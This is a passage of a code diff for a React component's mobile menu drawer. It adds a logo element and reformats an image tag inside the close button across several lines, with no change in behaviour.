+                className={styles.metaLogo}
+              />
               <button
                 type="button"
                 className={styles.mobileDrawerClose}
                 onClick={() => setShowMobileMenu(false)}
                 aria-label={common.closeMenuAriaLabel}
               >
-                <Image src="/www.facebook.com-16.svg" alt="" width={16} height={16} />
+                <Image
+                  src="/www.facebook.com-16.svg"
+                  alt=""
+                  width={16}
+                  height={16}
+                />
               </button>
             </div>
             <div className={styles.mobileDrawerContent}>
